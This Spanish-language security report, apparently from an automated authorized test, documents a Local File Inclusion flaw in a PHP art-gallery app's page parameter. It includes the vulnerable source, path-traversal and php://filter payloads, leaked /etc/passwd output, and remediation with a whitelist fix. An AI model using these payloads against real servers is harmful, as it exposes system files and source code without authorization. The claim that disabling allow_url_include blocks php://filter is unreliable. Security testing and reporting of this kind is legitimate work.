# Informe de Análisis de Vulnerabilidad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 15:57:24  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Resultado:** Vulnerabilidad ENCONTRADA y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se identificó y explotó una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante no autenticado leer archivos arbitrarios del sistema de archivos del servidor, incluyendo archivos sensibles del sistema operativo.

---

## 2. Descripción del Objetivo

- **URL:** http://web.dev.local:8081
- **Aplicación:** Galería de Arte Virtual (PHP)
- **Archivo vulnerable:** `/var/www/html/gallery.php`
- **Parámetro vulnerable:** `page`

---

## 3. Descubrimiento

Al analizar la página principal (`http://web.dev.local:8081/`), se identificaron los siguientes enlaces en el menú de navegación:

```
gallery.php?page=modern
gallery.php?page=classic
gallery.php?page=abstract
gallery.php?page=about
```

El parámetro `page` es directamente utilizado para incluir archivos en el servidor, lo cual es un vector clásico de LFI.

---

## 4. Análisis del Código Vulnerable

Mediante la técnica de **PHP Filter** (`php://filter/convert.base64-encode`), se obtuvo el código fuente de `gallery.php`:

```php
<?php
$page = $_GET['page'] ?? 'modern';
?>
...
<?php
// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
?>
```

**Problemas identificados:**
1. El parámetro `page` se usa directamente en `include()` sin sanitización.
2. Si el valor contiene un punto (`.`), se usa directamente como ruta de archivo — permitiendo path traversal con `../../../`.
3. El archivo es incluido incluso cuando `file_exists()` retorna falso (`@include($file)`), amplificando el impacto.

---

## 5. Explotación

### 5.1 Lectura de `/etc/passwd`

**Payload utilizado:**
```
GET /gallery.php?page=../../../etc/passwd
```

**Resultado exitoso:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 5.2 Lectura de `/etc/hosts`

**Payload:**
```
GET /gallery.php?page=../../../etc/hosts
```

**Resultado:**
```
127.0.0.1    localhost
::1          localhost ip6-localhost ip6-loopback
fe00::       ip6-localnet
ff00::       ip6-mcastprefix
ff02::1      ip6-allnodes
```

### 5.3 Lectura del Código Fuente via PHP Filter

**Payload:**
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php
```

Esto permitió obtener el código fuente PHP completo en base64 y decodificarlo, revelando la lógica vulnerable de la aplicación.

### 5.4 Intento de Lectura de `/etc/shadow`

**Payload:**
```
GET /gallery.php?page=../../../etc/shadow
```

**Resultado:** Acceso denegado (Permission denied) — el proceso web (www-data) no tiene permisos para leer `/etc/shadow`.

---

## 6. Impacto

| Archivo | Estado | Impacto |
|---------|--------|---------|
| `/etc/passwd` | ✅ Leído | Enumeración de usuarios del sistema |
| `/etc/hosts` | ✅ Leído | Mapeo de red interna |
| `gallery.php` (fuente) | ✅ Leído (via PHP filter) | Exposición del código fuente |
| `/etc/shadow` | ❌ Denegado | Hashes de contraseñas (protegido) |
| `/proc/self/environ` | ❌ Denegado | Variables de entorno del proceso |

**Severidad:** 🔴 **CRÍTICA** (CVSS v3: ~9.1)

---

## 7. Ruta del Servidor

A través de los mensajes de error revelados por la aplicación, se confirmó la ruta absoluta del servidor:

```
/var/www/html/gallery.php (línea 104)
```

---

## 8. Recomendaciones

1. **Nunca usar input del usuario directamente en `include()`** — implementar una whitelist de páginas permitidas.
2. **Eliminar la llamada `@include($file)` cuando el archivo no existe** — esto amplía innecesariamente el vector de ataque.
3. **Deshabilitar `allow_url_include` en `php.ini`** para bloquear wrappers como `php://filter`.
4. **Validar y sanitizar el parámetro `page`** — solo permitir valores alfanuméricos sin puntos ni barras.
5. **Implementar un mapa de rutas fijo:**

```php
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';
if (!in_array($page, $allowed_pages)) {
    $page = 'modern';
}
include("pages/" . $page . ".php");
```

6. **Configurar mensajes de error personalizados** para no revelar rutas del sistema en producción.

---

## 9. Conclusión

La aplicación "Galería de Arte Virtual" presenta una vulnerabilidad **Local File Inclusion crítica** en el parámetro `page` de `gallery.php`. La ausencia de validación de entrada permite a un atacante no autenticado leer archivos sensibles del sistema mediante path traversal (`../`), así como abusar del wrapper `php://filter` para obtener el código fuente PHP. Se recomienda corregir esta vulnerabilidad de inmediato.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
